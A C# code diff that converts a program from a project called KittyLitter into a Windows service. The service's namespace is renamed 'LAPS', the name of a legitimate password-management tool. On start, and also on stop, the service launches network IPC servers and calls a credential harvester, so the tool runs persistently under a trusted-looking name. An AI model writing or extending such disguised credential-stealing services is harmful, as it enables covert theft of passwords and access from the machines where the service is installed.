@@ -1,14 +1,23 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
 using System.Linq;
+using System.ServiceProcess;
 using System.Text;
 using KittyLitter.IPCServers;
 using System.Threading;
 
-namespace KittyLitter
+namespace LAPS
 {
-    class Program
+    public partial class Service1 : ServiceBase
     {
+        public Service1()
+        {
+            InitializeComponent();
+        }
+
         public static void Worker()
         {
             TCPServer tcp = new TCPServer();
@@ -20,11 +29,15 @@ namespace KittyLitter
                 Thread t = new Thread(() => server.ServeServer());
                 t.Start();
             }
-            CredHarvester.Start();
+            KittyLitter.CredHarvester.Start();
         }
 
+        protected override void OnStart(string[] args)
+        {
+            Worker();
+        }
 
-        static void Main(string[] args)
+        protected override void OnStop()
         {
             Worker();
         }
